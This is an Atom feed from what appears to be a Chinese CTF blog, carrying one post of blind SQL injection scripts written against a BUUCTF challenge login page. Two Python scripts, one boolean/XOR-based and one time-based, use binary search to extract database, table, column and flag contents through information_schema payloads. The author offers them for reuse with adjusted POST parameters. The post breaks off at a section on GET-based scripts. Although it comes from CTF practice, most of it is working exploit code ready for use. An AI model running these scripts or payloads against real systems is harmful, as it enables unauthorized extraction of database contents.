<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://imfanqie.top</id>
    <title>imFanqie • Posts by &#34;sql注入&#34; category</title>
    <link href="http://imfanqie.top" />
    <updated>2021-08-17T13:51:59.954Z</updated>
    <category term="随笔" />
    <category term="debug" />
    <category term="业余爱好" />
    <category term="文件包含" />
    <category term="反序列化" />
    <category term="命令执行" />
    <category term="RCE" />
    <category term="http" />
    <category term="sql" />
    <category term="代码审计" />
    <category term="upload" />
    <category term="SSRF" />
    <category term="SSTI" />
    <category term="python" />
    <category term="php" />
    <entry>
        <id>http://imfanqie.top/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</id>
        <title>ctfweb-各种盲注脚本</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
        <content type="html">&lt;p&gt;以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼&lt;/p&gt;
&lt;p&gt;核心算法都是&lt;strong&gt;二分法&lt;/strong&gt;，不推荐时间盲注（速度硬伤）&lt;/p&gt;
&lt;p&gt;脚本 payload 参考题目：[第一章 web 入门] SQL 注入 - 2  / 极客大挑战 finilysql（buuctf）&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1通过post传参的脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1通过post传参的脚本&#34;&gt;#&lt;/a&gt; 1. 通过 post 传参的脚本&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;用的时候修改 post 参数和个数&lt;/p&gt;
&lt;h2 id=&#34;11-基于异或盲注布尔盲注等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11-基于异或盲注布尔盲注等&#34;&gt;#&lt;/a&gt; 1.1 基于&lt;strong&gt;异或盲注&lt;/strong&gt;，&lt;strong&gt;布尔盲注&lt;/strong&gt;等：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; high &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; low&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or ascii (substr (database (),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;#&#34;    #查库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)=&#39;note&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;#&#34;   #查表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)=&#39;fl4g&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;#&#34;   #查列&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;1&#39; or ascii(substr((seleCt(flag)from(fl4g)),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;#&#34;&lt;/span&gt;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;pass&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;qwer&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;u6216&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;       &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; low &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        flag &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;12-基于时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12-基于时间盲注&#34;&gt;#&lt;/a&gt; 1.2 基于&lt;strong&gt;时间盲注&lt;/strong&gt;：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; high &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; low&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or if (ascii (substr (database (),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;,sleep (2),1)#&#34;       #查库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39;or if (ascii (substr ((seleCt (group_concat (table_name)) from (information_schema.tables) where (table_schema)=&#39;note&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;,sleep (2),1)#&#34;        #查表名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39;or if (ascii (substr ((seleCt (group_concat (column_name)) from (information_schema.columns) where (table_name)=&#39;users&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;,sleep (2),1)#&#34;        #查列名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;1&#39;or if(ascii(substr((seleCt(flag)from(fl4g)),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,sleep(2),1)#&#34;&lt;/span&gt;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;#查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;pass&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;qwer&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        last &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        now &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; now &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; last &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; low &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        flag &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;2通过get传参的脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2通过get传参的脚本&#34;&gt;#&lt;/a&gt; 2. 通过 get 